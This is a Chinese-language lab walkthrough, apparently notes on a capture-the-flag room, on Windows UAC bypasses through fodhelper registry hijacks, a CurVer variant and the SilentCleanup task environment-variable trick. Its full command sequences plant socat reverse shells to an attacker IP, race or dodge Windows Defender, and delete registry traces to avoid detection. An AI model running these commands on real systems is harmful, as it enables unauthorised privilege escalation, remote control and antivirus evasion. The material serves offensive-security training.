<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543669.png" alt></p>
<p>要检索 azman 标志，请使用获取的高完整性控制台执行：</p>
<pre><code class="hljs scss">C:\&gt; C:\flags\GetFlag-azman.exe</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543670.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543671.png" alt></p>
<h1 id="0x04-uac-自动提升进程">0x04 UAC: 自动提升进程</h1>
<h2 id="自动提升">自动提升</h2>
<p>如前所述，某些可执行文件可以自动提升，无需任何用户干预即可实现高 IL。这适用于控制面板的大部分功能和 Windows 提供的一些可执行文件。</p>
<p>对于应用程序，需要满足一些要求才能自动提升：</p>
<ul>
<li>可执行文件必须由 Windows 发布者签名</li>
<li>可执行文件必须包含在受信任的目录中，例如<code>%SystemRoot%/System32/</code>或<code>%ProgramFiles%/</code></li>
</ul>
<p>根据申请类型，可能适用其他要求：</p>
<ul>
<li>可执行文件 (.exe) 必须在其清单中声明<strong>autoElevate</strong>元素。要检查文件的清单，我们可以使用**<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck">sigcheck</a>**&nbsp;，这是 Sysinternals 套件中提供的一个工具。您可以在计算机上的<code>C:\tools\</code>中找到 sigcheck 的副本。如果我们检查 msconfig.exe 的清单，我们将找到 autoElevate 属性：</li>
</ul>
<pre><code class="hljs xml">C:\tools\&gt; sigcheck64.exe -m c:/windows/system32/msconfig.exe ... <span class="hljs-tag">&lt;<span class="hljs-name">asmv3:application</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">asmv3:windowsSettings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">dpiAware</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">dpiAware</span>&gt;</span> 
<span class="hljs-tag">&lt;<span class="hljs-name">autoElevate</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">autoElevate</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">asmv3:windowsSettings</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">asmv3:application</span>&gt;</span></code></pre>
<ul>
<li>mmc.exe 将根据用户请求的 .msc 管理单元自动提升。 Windows 附带的大多数 .msc 文件都会自动提升。</li>
<li>Windows 会保留一个附加的可执行文件列表，即使清单中未请求，也会自动提升。例如，此列表包括 pkgmgr.exe 和 spinstall.exe。</li>
<li>COM 对象还可以通过配置一些注册表项来请求自动提升（&nbsp;<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker">https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker</a>&nbsp;）。</li>
</ul>
<h2 id="案例研究fodhelper">案例研究：Fodhelper</h2>
<p>Fodhelper.exe 是 Windows 默认可执行文件之一，负责管理 Windows 可选功能，包括其他语言、默认情况下未安装的应用程序或其他操作系统特征。与大多数用于系统配置的程序一样，fodhelper 可以在使用默认 UAC 设置时自动提升，这样管理员在执行标准管理任务时就不会收到提升的提示。虽然我们已经研究了 autoElevate 可执行文件，但与 msconfig 不同，fodhelper 可以在无法访问GUI 的情况下被滥用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543672.png" alt></p>
<p>从攻击者的角度来看，这意味着它可以通过中等完整性远程 shell 来使用，并利用到功能齐全的高完整性进程中。这种特殊技术是由<a target="_blank" rel="noopener" href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/">@winscripting</a>发现的，并已被<a target="_blank" rel="noopener" href="https://www.cybereason.com/blog/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit">Glupteba 恶意软件</a>广泛使用。</p>
<p>值得注意的是，fodhelper 会在注册表中搜索感兴趣的特定密钥：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543673.png" alt></p>
<p>当 Windows 打开文件时，它会检查注册表以了解要使用哪个应用程序。注册表为每种文件类型保存一个称为程序 ID (ProgID) 的键，其中与相应的应用程序相关联。假设您尝试打开一个 HTML 文件。将检查注册表中称为 HKEY_CLASSES_ROOT 的一部分，以便系统知道它必须使用您首选的 Web 客户端来打开它。要使用的命令将在每个文件的 ProgID 的 shell/open/command 子键下指定。以“htmlfile”ProgID 为例：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543674.png" alt></p>
<p>实际上，HKEY_CLASSES_ROOT 只是注册表上两个不同路径的合并视图：</p>
<table>
<thead>
<tr>
<th><strong>Path&nbsp;小路</strong></th>
<th><strong>Description&nbsp;描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>HKEY_LOCAL_MACHINE\Software\Classes</td>
<td>系统范围的文件关联</td>
</tr>
<tr>
<td>HKEY_CURRENT_USER\Software\Classes</td>
<td>活动用户的文件关联</td>
</tr>
</tbody>
</table>
<p>检查 HKEY_CLASSES_ROOT 时，如果**HKEY_CURRENT_USER (HKCU)<strong>处存在特定于用户的关联，则它将优先。如果未配置用户特定的关联，则将使用</strong>HKEY_LOCAL_MACHINE (HKLM)**中的系统范围关联。这样，每个用户都可以根据需要单独选择他们喜欢的应用程序。</p>
<p>回到 fodhelper，我们现在看到它正在尝试打开 ms-settings ProgID 下的文件。通过在 HKCU 下的当前用户上下文中为该 ProgID 创建关联，我们将覆盖默认的系统范围关联，从而控制使用哪个命令来打开文件。由于 fodhelper 是一个 autoElevate 可执行文件，因此它生成的任何子进程都将继承一个高完整性令牌，从而有效地绕过UAC&nbsp;。</p>
<p>回到 fodhelper，我们现在看到它正在尝试打开 ms-settings ProgID 下的文件。通过在 HKCU 下的当前用户上下文中为该 ProgID 创建关联，我们将覆盖默认的系统范围关联，从而控制使用哪个命令来打开文件。由于 fodhelper 是一个 autoElevate 可执行文件，因此它生成的任何子进程都将继承一个高完整性令牌，从而有效地绕过UAC&nbsp;。</p>
<h2 id="把它们放在一起">把它们放在一起</h2>
<p>我们的一名特工已在目标服务器上植入后门，以方便您使用。他设法在管理员组中创建了一个帐户，但 UAC 阻止了任何特权任务的执行。要检索该标志，他需要您绕过 UAC 并获得功能齐全的高 IL shell。</p>
<p>要连接后门，可以使用以下命令：</p>
<pre><code class="hljs scss">nc <span class="hljs-number">10.10</span><span class="hljs-selector-class">.194</span><span class="hljs-selector-class">.68</span> <span class="hljs-number">9999</span></code></pre>
<p>连接后，我们检查我们的用户是否属于管理员组，并且它正在使用中等完整性令牌运行：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@kali</span>$ nc <span class="hljs-number">10.10</span>.<span class="hljs-number">194.68</span> <span class="hljs-number">9999</span>
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

<span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami
myserver\attacker

<span class="hljs-attribute">C</span>:\Windows\system32&gt;net user attacker | find <span class="hljs-string">"Local Group"</span>
Local Group Memberships      *Administrators       *Users                

<span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami /groups | find <span class="hljs-string">"Label"</span>
Mandatory Label\Medium Mandatory Level                        Label            S-<span class="hljs-number">1</span>-<span class="hljs-number">16</span>-<span class="hljs-number">8192</span></code></pre>
<p>我们设置所需的注册表值以将 ms-settings 类关联到反向 shell。为了您的方便，可以在<code>c:\tools\socat\</code>中找到<strong>socat</strong>的副本。您可以使用以下命令从标准命令行设置所需的注册表项：</p>
<pre><code class="hljs scss">C:\&gt; set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\&gt; set CMD=<span class="hljs-string">"powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.14.79.125:5555 EXEC:cmd.exe,pipes"</span>
//上面就是设置了临时环境变量

C:\&gt; reg add %REG_KEY% /v <span class="hljs-string">"DelegateExecute"</span> /d <span class="hljs-string">""</span> /f
The operation completed successfully.

- 这条命令使用&nbsp;`reg add`&nbsp;向注册表添加或修改键值。
- `%REG_KEY%`&nbsp;是之前设置的环境变量，指向注册表的特定路径。
- `/v <span class="hljs-string">"DelegateExecute"</span>`&nbsp;指定要添加或修改的值名为&nbsp;`DelegateExecute`。
- `/d <span class="hljs-string">""</span>`&nbsp;设置该值的数据为空字符串。
- `/f`&nbsp;表示强制执行，即使值已存在也会覆盖。

C:\&gt; reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.

- 这条命令向同一个注册表键添加或修改默认值（即没有指定值名，通常显示为&nbsp;`(Default)`）。
- `/d %CMD%`&nbsp;设置默认值的数据为之前设置的环境变量&nbsp;`CMD`&nbsp;的值，即执行&nbsp;`socat`&nbsp;的 PowerShell 命令。
- 同样使用&nbsp;`/f`&nbsp;参数强制执行。</code></pre>
<blockquote>
<p>这些命令的组合效果是，在注册表中创建或修改了一个键，当触发这个键时（例如，通过 Windows 设置应用的某个操作），将会执行一个 PowerShell 脚本，该脚本使用 <code>socat</code> 工具在指定的 IP 地址和端口上建立 TCP 连接，并执行 <code>cmd.exe</code>，允许远程执行命令。</p>
</blockquote>
<p>请注意我们如何需要创建一个名为<strong>DelegateExecute</strong>的空值才能使类关联生效。如果此注册表值不存在，操作系统将忽略该命令并使用系统范围的类关联。</p>
<p>我们在我们的机器中使用 netcat 设置监听器：</p>
<p><code>nc -lvp 5555</code></p>
<p>然后继续执行<strong>fodhelper.exe</strong>&nbsp;，这又会触发我们的反向shell的执行：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543675.png" alt></p>
<p>接收到的shell以高完整性运行，表明我们已成功绕过UAC。</p>
<p>要检索 fodhelper 标志，请使用新 shell 执行：</p>
<pre><code class="hljs scss">C:\&gt; C:\flags\GetFlag-fodhelper.exe</code></pre>
<p><strong>注意：请记住，仅当您通过 fodhelper 成功绕过UAC且仅从生成的高完整性 shell 中才会返回该标志。</strong></p>
<h2 id="清理痕迹">清理痕迹</h2>
<p>执行此漏洞的结果是，在目标系统上以注册表项的形式创建了一些工件。为了避免检测到，我们需要使用以下命令进行清理：</p>
<pre><code class="hljs scss">reg delete HKCU\Software\Classes\ms-settings\ /f</code></pre>
<p><strong>注意：请务必执行给定的命令，以避免任何人为因素干扰以下任务。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543676.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543677.png" alt></p>
<h1 id="0x05-uac-改进fodhelper漏洞绕过windefender">0x05 UAC: 改进Fodhelper漏洞绕过WinDefender</h1>
<h2 id="windows-defender">Windows Defender</h2>
<p>为简单起见，我们的目标计算机已禁用 Windows Defender。但如果启用它会发生什么呢？</p>
<p>首先，使用GUI连接，转到桌面并双击以下图标以启用 Windows Defender：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543678.png" alt></p>
<p>现在尝试通过后门连接再次利用 fodhelper 并查看服务器的GUI上会发生什么。正如您更改<code>(default)</code>&nbsp;<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>中的值要插入反向 shell 命令，将弹出 Windows Defender 通知：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543679.png" alt></p>
<p>通过单击通知，我们可以检查警报的详细信息，其中提到通过修改注册表值尝试绕过UAC&nbsp;：<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543680.png" alt></p>
<p>如果你在注册表中查询相应的值，你会发现它已经被删除了：</p>
<pre><code class="hljs scss">C:\Windows\system32&gt;reg query %REG_KEY% /v <span class="hljs-string">""</span>

HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    (Default)    REG_SZ    (value not set)</code></pre>
<p>虽然到目前为止，我们的漏洞似乎无法在启用 Windows Defender 的情况下工作，但请检查一下如果您运行相同的命令但稍加修改会发生什么（请务必在需要时替换您的 IP 地址）：</p>
<pre><code class="hljs scss">C:\&gt; set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\&gt; set CMD=<span class="hljs-string">"powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"</span>

C:\&gt; reg add %REG_KEY% /v <span class="hljs-string">"DelegateExecute"</span> /d <span class="hljs-string">""</span> /f
The operation completed successfully.

C:\&gt; reg add %REG_KEY% /d %CMD% /f &amp; reg query %REG_KEY%
HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
    DelegateExecute    REG_SZ    
    (Default)    REG_SZ    powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:<span class="hljs-number">4444</span> EXEC:cmd.exe,pipes</code></pre>
<p>在将有问题的注册表值设置为我们的反向 shell 所需的命令后，我们立即添加了对有问题的注册表值的快速查询。令人惊讶的是，查询完整地输出了我们的命令。我们仍然会收到 Windows Defender 的警报，一秒钟后，有问题的注册表值会按预期被删除。 Windows Defender 似乎需要一段时间才能对我们的漏洞采取行动，因此让我们在攻击者的计算机上设置一个反向侦听器：</p>
<pre><code class="hljs scss">nc -lvp <span class="hljs-number">4444</span></code></pre>
<p>并将漏洞修改为设置注册表值后立即运行fodhelper.exe。如果命令运行得足够快，它就会正常工作（请务必在需要时替换您的 IP 地址）:</p>
<pre><code class="hljs scss">C:\&gt; set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\&gt; set CMD=<span class="hljs-string">"powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"</span>

C:\&gt; reg add %REG_KEY% /v <span class="hljs-string">"DelegateExecute"</span> /d <span class="hljs-string">""</span> /f
The operation completed successfully.

C:\&gt; reg add %REG_KEY% /d %CMD% /f &amp; fodhelper.exe</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543681.png" alt></p>
<p>如上图，虽然还是被检测了，但是我们仍然得到了shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543682.png" alt></p>
<p>根据您的运气，fodhelper 可能会在 AV 启动之前执行，给您一个反向 shell。如果由于某种原因它不适合您，请记住此方法不可靠，因为它取决于AV和首先执行的有效负载之间的竞争。如果反向 shell 不起作用，请继续讨论房间的其余部分，因为下面将给出绕过 Windows Defender 的更一致的方法。</p>
<p>不过，Windows Defender 仍然会发出有关绕过的警报。我们当前漏洞利用的问题在于，它几乎没有提供变化的空间，因为我们需要编写特定的注册表项才能触发它，从而使 Windows Defender 很容易检测到。但对此仍有一些事情要做。</p>
<h2 id="改进-fodhelper-漏洞利用">改进 fodhelper 漏洞利用</h2>
<p><a target="_blank" rel="noopener" href="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses">@V3ded</a>提出了 fodhelper 漏洞利用的变体，其中使用不同的注册表项，但基本原理是相同的。</p>
<p>我们不会将有效载荷写入 <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>，而是使用 progID 注册表项下的 CurVer 条目。当您在同一系统上运行具有不同版本的多个应用程序实例时，使用此条目。CurVer 允许您指向 Windows 在打开给定文件类型时要使用的应用程序的默认版本。</p>
<p>为此，我们将在注册表中为我们选择的新 progID 创建一个条目（任何名称都可以），然后将 ms-settings progID 中的 CurVer 条目指向我们新创建的 progID。这样，当 fodhelper 尝试使用 ms-settings progID 打开文件时，它会注意到指向我们新 progID 的 CurVer 条目，并检查它以查看要使用的命令。</p>
<p>@V3ded 提出的漏洞代码使用 Powershell 来实现此目的。以下是它的修改版本，适合使用我们的反向 shell（请务必在需要时替换您的 IP 地址）：</p>
<pre><code class="hljs powershell"><span class="hljs-variable">$program</span> = <span class="hljs-string">"powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.14.79.125:5555 EXEC:cmd.exe,pipes"</span>

<span class="hljs-built_in">New-Item</span> <span class="hljs-string">"HKCU:\Software\Classes\.pwn\Shell\Open\command"</span> <span class="hljs-literal">-Force</span>
<span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-string">"HKCU:\Software\Classes\.pwn\Shell\Open\command"</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">"(default)"</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$program</span> <span class="hljs-literal">-Force</span>
    
<span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">"HKCU:\Software\Classes\ms-settings\CurVer"</span> <span class="hljs-literal">-Force</span>
<span class="hljs-built_in">Set-ItemProperty</span>  <span class="hljs-string">"HKCU:\Software\Classes\ms-settings\CurVer"</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">"(default)"</span> <span class="hljs-literal">-value</span> <span class="hljs-string">".pwn"</span> <span class="hljs-literal">-Force</span>
    
<span class="hljs-built_in">Start-Process</span> <span class="hljs-string">"C:\Windows\System32\fodhelper.exe"</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span></code></pre>
<p>此漏洞利用名称.pwn**创建一个新的 progID，并将我们的有效负载与打开此类文件时使用的命令相关联。然后它将 ms-settings 的 CurVer 条目指向我们的 .pwn progID。当 fodhelper 尝试打开 ms-settings 程序时，它将被指向 .pwn progID 并使用其关联的命令。</p>
<p>这种技术更有可能逃避 Windows Defender，因为我们可以更自由地将有效负载放在何处，因为保存有效负载的 progID 的名称完全是任意的。让我们在攻击者的机器上启动一个新的反向 shell：</p>
<pre><code class="hljs scss">nc -lvp <span class="hljs-number">5555</span></code></pre>
<p>并按原样从我们的后门连接执行漏洞利用。因此，Windows Defender 将抛出另一个引用我们操作的警报：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543683.png" alt></p>
<p>尽管我们仍然会被检测到，但必须注意的是，有时反病毒软件使用的检测方法是严格针对已发布的漏洞实施的，而不考虑可能的变化。如果我们将 Powershell 的漏洞利用转换为使用 cmd.exe，则 AV 不会发出任何警报（请务必在需要时替换您的 IP 地址）</p>
<pre><code class="hljs scss">C:\&gt; set CMD=<span class="hljs-string">"powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.14.79.125:5555 EXEC:cmd.exe,pipes"</span>

C:\&gt; reg add <span class="hljs-string">"HKCU\Software\Classes\.thm\Shell\Open\command"</span> /d %CMD% /f
The operation completed successfully.

C:\&gt; reg add <span class="hljs-string">"HKCU\Software\Classes\ms-settings\CurVer"</span> /d <span class="hljs-string">".thm"</span> /f
The operation completed successfully.

C:\&gt; fodhelper.exe</code></pre>
<p>我们得到了一个高完整性的反向shell：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@kali</span>$ nc -lvp <span class="hljs-number">4445</span>      
Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4445</span>
Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">183.127</span> <span class="hljs-number">23441</span>
Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]
(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.

<span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami /groups | find <span class="hljs-string">"Label"</span>
Mandatory Label\High Mandatory Level                          Label            S-<span class="hljs-number">1</span>-<span class="hljs-number">16</span>-<span class="hljs-number">12288</span></code></pre>
<p>要检索 fodhelper-curver 标志，请使用新 shell 执行：</p>
<pre><code class="hljs scss">C:\&gt; C:\flags\GetFlag-fodhelper-curver.exe</code></pre>
<p>注意：请记住，仅当您通过 fodhelper<strong>成功</strong>绕过UAC且仅通过 socat 从生成的高完整性 shell 中才会返回该标志。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543684.png" alt></p>
<h2 id="清理痕迹">清理痕迹</h2>
<p>执行此漏洞的结果是，在目标系统上创建了一些工件，例如注册表项。为了避免检测，我们需要使用以下命令进行清理：</p>
<pre><code class="hljs scss">reg delete "HKCU\Software\Classes\<span class="hljs-selector-class">.thm</span>\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f</code></pre>
<p><strong>注意：请务必执行给定的命令，以避免任何人为因素干扰以下任务。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543685.png" alt></p>
<h1 id="0x06-uac-环境变量拓展">0x06 UAC: 环境变量拓展</h1>
<h2 id="绕过-always-notify">绕过 Always Notify</h2>
<p>如上一个任务所示，在默认 Windows 配置上，您可以滥用与系统配置相关的应用程序来绕过 UAC，因为大多数这些应用程序都在其清单中设置了 autoElevate 标志。但是，如果 UAC 配置为“始终通知”级别，fodhelper 和类似的应用程序将没有任何用处，因为它们将要求用户通过UAC提示来提升。这将阻止使用几种已知的旁路方法，但并非所有希望都破灭了。</p>
<p>对于以下技术，我们将滥用可由任何用户运行但将以调用者可用的最高权限执行的计划任务。计划任务是一个令人兴奋的目标。根据设计，它们旨在在没有任何用户交互的情况下运行（独立于 UAC 安全级别），因此要求用户手动提升进程不是一个选择。任何需要提升的计划任务都将自动获得提升，而无需经过 UAC 提示。</p>
<h2 id="案例研究磁盘清理计划任务">案例研究：磁盘清理计划任务</h2>
<p>**注意：请务必为此任务禁用 Windows Defender，否则运行漏洞时可能会遇到一些困难。***只需运行计算机桌面上提供的快捷方式即可将其禁用。</p>
<p>要了解我们选择磁盘清理的原因，让我们打开<strong>任务计划程序</strong>并检查任务的配置：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543686.png" alt></p>
<p>在这里我们可以看到该任务被配置为<strong>使用用户</strong>帐户运行，这意味着它将继承调用用户的权限。&nbsp;<strong>“以最高权限运行</strong>”选项将使用调用用户可用的最高权限安全令牌，这对于管理员来说是一个高 IL 令牌。请注意，如果常规非管理员用户调用此任务，它将仅使用中等 IL 执行，因为这是非管理员可用的最高权限令牌，因此绕过将不起作用。</p>
<p>检查“Actions”和“Settings”选项卡，我们有以下内容：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543687.png" alt></p>
<p>该任务可以按需运行，在调用时执行以下命令：</p>
<p><code>%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%</code></p>
<p>由于该命令取决于环境变量，因此我们可以通过它们注入命令并通过手动启动 DiskCleanup 任务来执行它们。</p>
<p>幸运的是，我们可以通过在<code>HKCU\Environment</code>中创建一个条目来通过注册表覆盖<code>%windir%</code>变量。如果我们想使用 socat 执行反向 shell，我们可以按如下方式设置<code>%windir%</code>&nbsp;（不带引号）：</p>
<p><code>"cmd.exe /c C:\tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes &amp;REM "</code></p>
<p>在命令末尾，我们连接“&amp;REM”（以空格结尾）来注释在扩展环境变量以获得 DiskCleanup 使用的最终命令时放在<code>%windir%</code>后面的任何内容。生成的命令将是（请务必在需要时替换您的 IP 地址）：</p>
<p><code>cmd.exe /c C:\tools\socat\socat.exe&nbsp;TCP:10.14.79.125:5555 EXEC:cmd.exe,pipes &amp;REM \system32\cleanmgr.exe /autoclean /d %systemdrive%</code></p>
<p>“REM”之后的任何内容都将作为注释被忽略。</p>
<h2 id="把它们放在一起">把它们放在一起</h2>
<p>让我们用 nc 设置一个反向 shell 的监听器：<br>
<code>nc -lvp 4446</code></p>
<p>然后我们将连接到端口 9999 上提供的后门：<br>
<code>nc 10.10.34.237 9999</code></p>
<p>最后，运行以下命令将我们的有效负载写入<code>%windir%</code>&nbsp;，然后执行DiskCleanup任务（请务必在需要时替换您的IP地址）:</p>
<pre><code class="hljs scss">C:\&gt; reg add <span class="hljs-string">"HKCU\Environment"</span> /v <span class="hljs-string">"windir"</span> /d <span class="hljs-string">"cmd.exe /c C:\tools\socat\socat.exe TCP:10.14.79.125:4446 EXEC:cmd.exe,pipes &amp;REM "</span> /f

C:\&gt; schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I</code></pre>
<pre><code class="hljs scss">`schtasks` 是 Windows 系统中的一个命令行工具，用于安排和管理任务。这些任务可以是一次性的，也可以是重复执行的。`schtasks` 命令允许用户创建、删除、查询、更改、运行或结束计划任务。

下面是对 `schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /<span class="hljs-selector-tag">I</span>` 命令的详细解释：

<span class="hljs-number">1</span>. **`schtasks`**：
   - 这是命令的名称，调用 Windows 任务计划程序。

<span class="hljs-number">2</span>. **`/run`**：
   - 这是 `schtasks` 命令的一个选项，用于立即运行指定的任务。

<span class="hljs-number">3</span>. **`/tn`**：
   - 这是 `schtasks` 命令的一个选项，后面跟着的是任务的名称。`/tn` 代表 "Task Name"，即任务名称。

<span class="hljs-number">4</span>. **`\Microsoft\Windows\DiskCleanup\SilentCleanup`**：
   - 这是任务的完整路径和名称。在这个例子中，任务名称是 `SilentCleanup`，它属于 `Microsoft\Windows\DiskCleanup` 任务组。这个任务通常用于执行磁盘清理操作（如删除临时文件、清空回收站等），而 `SilentCleanup` 特别指的是在没有用户交互的情况下自动执行。

<span class="hljs-number">5</span>. **`/<span class="hljs-selector-tag">I</span>`**：
